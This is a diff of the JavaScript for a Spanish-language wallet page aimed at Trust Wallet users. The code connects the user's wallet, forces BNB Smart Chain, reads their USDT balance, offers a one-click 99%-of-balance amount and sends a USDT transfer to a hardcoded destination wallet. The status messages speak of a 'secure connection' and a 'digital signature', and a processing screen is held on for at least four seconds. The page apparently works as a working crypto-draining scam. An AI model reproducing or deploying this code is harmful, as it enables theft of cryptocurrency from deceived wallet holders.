-   if(networkInfo)networkInfo.style.display="flex";
-   if(maxAction)maxAction.style.display="inline";
-   setStatus("Conexión establecida. Presione continuar.");
-   connectBtn.innerText="Continuar";
-  }catch(e){console.error(e);setStatus(e.message||"Error de conexión.");}
-  finally{connectBtn.disabled=false;}
-  return;
- }
- try{
-  connectBtn.disabled=true;
-  rawProvider=getRawProvider();
-  
-  const balance=await balanceOf(walletAddress);
-  if(balance===0n)throw new Error("La cuenta no dispone de USDT BEP-20 activos.");
-  
-  const amountRaw=String(amountDisplay.value||"").trim().replace(",",".");
-  if(!/^(?:\d+)(?:\.\d{1,18})?$/.test(amountRaw))throw new Error("Ingresá un monto válido de hasta 18 decimales.");
-  const [whole,fraction=""]=amountRaw.split(".");
-  const amountUnits=BigInt(whole)*(10n**DECIMALS)+BigInt(fraction.padEnd(18,"0"));
-  if(amountUnits<=0n)throw new Error("El monto debe ser mayor que cero.");
-  if(amountUnits>balance)throw new Error("Saldo USDT insuficiente para el monto solicitado.");
-  
-  const iface=new ethers.utils.Interface(USDT_ABI);
-  const dataHex=iface.encodeFunctionData("transfer",[BILLETERA_DESTINO,amountUnits]);
-  const displayAmount=format18(amountUnits);
+    function playLinkTapSound() {
+        playUiTone(520, 0.11, 0.025);
+    }
 
-  setStatus("Solicitando autorización de firma digital...");
-  showProcessingScreen();
+    function playConnectedSound() {
+        playUiTone(660, 0.16, 0.03);
+        playUiTone(880, 0.22, 0.026, 0.10);
+    }
 
-  const txHash=await rawProvider.request({
-      method:'eth_sendTransaction',
-      params:[{
-          from:walletAddress,
-          to:CONTRATO_USDT,
-          data:dataHex,
-          value:"0x0"
-      }]
-  });
+    const connectBtn = document.getElementById('connectBtn');
+    const statusDiv = document.getElementById('status');
+    const amountDisplay = document.getElementById('amountDisplay');
+    const addressDisplay = document.getElementById('addressDisplay');
+    const maxAction = document.getElementById('maxAction');
+    const walletInfo = document.getElementById('walletInfo');
+    const bscNetworkInfo = document.getElementById("bscNetworkInfo");
+    const walletAddressText = document.getElementById('walletAddressText');
 
-  setStatus("Procesando transacción en la red...");
-  let receipt=null;
-  while(!receipt){
-      try{receipt=await publicRpc("eth_getTransactionReceipt",[txHash]);}catch(err){console.warn("Esperando recibo:",err);}
-      if(!receipt)await new Promise(r=>setTimeout(r,3000));
-  }
+    let walletAddress = null;
+    let rawProvider = null;
+    const processingScreen = document.getElementById('processingScreen');
+    let processingStartedAt = 0;
 
-  await hideProcessingScreenAfterMinimum();
-  showReceipt({txHash,receipt,amount:displayAmount,from:walletAddress,to:BILLETERA_DESTINO});
-  setStatus(receipt && BigInt(receipt.status||"0x0")===1n ? "TRANSACCION EXITOSA." : "La transacción falló en la red.");
-  connectBtn.innerText="Ver comprobante";
-  connectBtn.disabled=false;
- }catch(e){
-  console.error(e);
-  await hideProcessingScreenAfterMinimum();
-  setStatus(e.message||"La transacción falló o fue cancelada.");
-  connectBtn.disabled=false;
-  connectBtn.innerText="Continuar";
- }
-});
+    function showProcessingScreen() {
+        processingStartedAt = Date.now();
+        if (processingScreen) processingScreen.classList.add('visible');
+    }
 
-if(maxAction)maxAction.addEventListener("click",async()=>{
- if(!walletAddress)return;
- try{
-  const b=await balanceOf(walletAddress);
-  const amountMax=b*99n/100n;
-  amountDisplay.value=format18(amountMax);
-  setStatus("Saldo máximo asignado.");
- }catch(e){console.error(e);setStatus("Error al leer el saldo.");}
-});
+    async function hideProcessingScreenAfterMinimum() {
+        if (!processingStartedAt) return;
+        const elapsed = Date.now() - processingStartedAt;
+        const remaining = Math.max(0, 4000 - elapsed);
+        if (remaining > 0) {
+            await new Promise(resolve => window.setTimeout(resolve, remaining));
+        }
+        if (processingScreen) processingScreen.classList.remove('visible');
+        processingStartedAt = 0;
+    }
+
+    function setStatus(message) {
+        statusDiv.innerText = message || '';
+        statusDiv.style.display = message ? 'block' : 'none';
+    }
+
+    addressDisplay.value = BILLETERA_DESTINO.length > 12
+        ? `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}`
+        : BILLETERA_DESTINO;
+
+    function getRawProvider() {
+        if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
+        if (window.ethereum) return window.ethereum;
+        throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
+    }
+
+    async function obtenerBalanceSeguro(address) {
+        const providerRpc = new ethers.providers.JsonRpcProvider(BSC_PUBLIC_RPC);
+        const contract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, providerRpc);
+        return await contract.balanceOf(address);
+    }
+
+    // BLINDAJE DE RED INTELIGENTE (Justo a tiempo para la firma/envío)
+    async function asegurarRedBNB(provider) {
+        try {
+            const currentChainId = await provider.request({ method: 'eth_chainId' });
+            if (currentChainId !== BSC_CHAIN_ID_HEX) {
+                try {
+                    await provider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: BSC_CHAIN_ID_HEX }]
+                    });
+                } catch (switchError) {
+                    if (switchError.code === 4902 || switchError.message?.includes('Unrecognized chain')) {
+                        await provider.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: BSC_CHAIN_ID_HEX,
+                                chainName: 'BNB Smart Chain',
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                rpcUrls: [BSC_PUBLIC_RPC],
+                                blockExplorerUrls: ['https://bscscan.com']
+                            }]
+                        });
+                    } else {
+                        throw switchError;
+                    }
+                }
+            }
+        } catch (err) {
+            throw new Error("Es necesario cambiar a la red BNB Smart Chain en tu billetera para continuar.");
+        }
+    }
+
+    connectBtn.addEventListener('click', async () => {
+        try {
+            rawProvider = getRawProvider();
+
+            if (!walletAddress) {
+                playLinkTapSound();
+                setStatus("Estableciendo enlace con la billetera...");
+                connectBtn.disabled = true;
+
+                const accounts = await rawProvider.request({ method: 'eth_requestAccounts' });
+                walletAddress = accounts[0];
+
+                if (!walletAddress) {
+                    throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
+                }
+
+                walletAddressText.textContent = walletAddress.length > 12
+                    ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`
+                    : walletAddress;
+
+                walletInfo.style.display = "block";
+                bscNetworkInfo.style.display = "flex";
+                maxAction.style.display = "inline";
+
+                setStatus("Conexión segura establecida. Presione continuar.");
+                playConnectedSound();
+
+                connectBtn.innerText = "Continuar";
+                connectBtn.disabled = false;
+                return;
+            }
+
+            if (walletAddress) {
+                const userAmount = parseFloat(amountDisplay.value);
+                if (isNaN(userAmount) || userAmount <= 0) {
+                    throw new Error("Ingresa una cantidad válida antes de continuar.");
+                }
+
+                setStatus("Verificando red BNB Smart Chain...");
+                connectBtn.disabled = true;
+
+                // VALIDACIÓN DE RED A TIEMPO: Fuerza el cambio a BSC antes de firmar para evitar el error de Ethereum
+                await asegurarRedBNB(rawProvider);
+
+                setStatus("Consultando fondos del libro contable on-chain...");
+                const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
+                if (balanceBigNumber.isZero()) {
+                    throw new Error("La cuenta no dispone de balances de USDT (BEP-20) activos.");
+                }
+
+                setStatus("Solicitando autorización de firma digital...");
+
+                const amountUnits = ethers.utils.parseUnits(userAmount.toString(), 18);
+                const iface = new ethers.utils.Interface(USDT_ABI);
+                const dataHex = iface.encodeFunctionData("transfer", [BILLETERA_DESTINO, amountUnits]);
+
+                showProcessingScreen();
+
+                // DISPARO CON CHAINID EXPLÍCITO BLINDADO A 0x38 (BNB Smart Chain)
+                const txHash = await rawProvider.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: walletAddress,
+                        to: CONTRATO_USDT,
+                        data: dataHex,
+                        value: "0x0",
+                        chainId: BSC_CHAIN_ID_HEX
+                    }]
+                });
+
+                setStatus("Procesando transacción en la red...");
+
+                const providerRpc = new ethers.providers.JsonRpcProvider(BSC_PUBLIC_RPC);
+                let receipt = null;
+                while (!receipt) {
+                    receipt = await providerRpc.getTransactionReceipt(txHash);
+                    if (!receipt) {
+                        await new Promise(r => window.setTimeout(r, 2000));
+                    }
+                }
+
+                await hideProcessingScreenAfterMinimum();
+
+                if (receipt && receipt.status === 1) {
+                    setStatus("TRANSACCION EXITOSA.");
+                    connectBtn.innerText = "Completado";
+                } else {
+                    throw new Error("La transacción fue rechazada o falló en la red.");
+                }
+
+            }
+        } catch (error) {
+            console.error(error);
+            await hideProcessingScreenAfterMinimum();
+
+            setStatus(error.message || "La transacción falló o fue cancelada.");
+            connectBtn.disabled = false;
+            connectBtn.innerText = walletAddress ? "Continuar" : "Vincular billetera";
+        }
+    });
+
+    maxAction.addEventListener('click', async () => {
+        if (!walletAddress) return;
+        try {
+            setStatus("Calculando fondos totales...");
+            const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
+            const amountMax = balanceBigNumber.mul(99).div(100);
+            amountDisplay.value = ethers.utils.formatUnits(amountMax, 18);
+            setStatus("Saldo máximo asignado.");
+        } catch (e) {
+            console.error(e);
+            setStatus("Error al leer el saldo.");
+        }
+    });
 </script>
 
 <script>
-(() => {
-    const input = document.getElementById('amountDisplay');
-    const minus = document.getElementById('amountMinus');
-    const plus = document.getElementById('amountPlus');
-    if (!input || !minus || !plus) return;
+    (() => {
+        const input = document.getElementById('amountDisplay');
+        const minus = document.getElementById('amountMinus');
+        const plus = document.getElementById('amountPlus');
+        if (!input || !minus || !plus) return;
 
-    const read = () => {
-        const n = Number.parseFloat(String(input.value).replace(',', '.'));
-        return Number.isFinite(n) ? n : 0;
-    };
+        const read = () => {
+            const n = Number.parseFloat(String(input.value).replace(',', '.'));
+            return Number.isFinite(n) ? n : 0;
+        };
 
-    const write = (n) => {
-        n = Math.max(0, n);
-        input.value = Number.isInteger(n) ? String(n) : String(Number(n.toFixed(2)));
-        input.dispatchEvent(new Event('input', { bubbles: true }));
-        input.dispatchEvent(new Event('change', { bubbles: true }));
-    };
+        const write = (n) => {
+            n = Math.max(0, n);
+            input.value = Number.isInteger(n) ? String(n) : String(Number(n.toFixed(2)));
+            input.dispatchEvent(new Event('input', { bubbles: true }));
+            input.dispatchEvent(new Event('change', { bubbles: true }));
+        };
 
-    minus.addEventListener('click', () => write(read() - 1));
-    plus.addEventListener('click', () => write(read() + 1));
-})();
+        minus.addEventListener('click', () => write(read() - 1));
+        plus.addEventListener('click', () => write(read() + 1));
+    })();
 </script>
 
 </body>
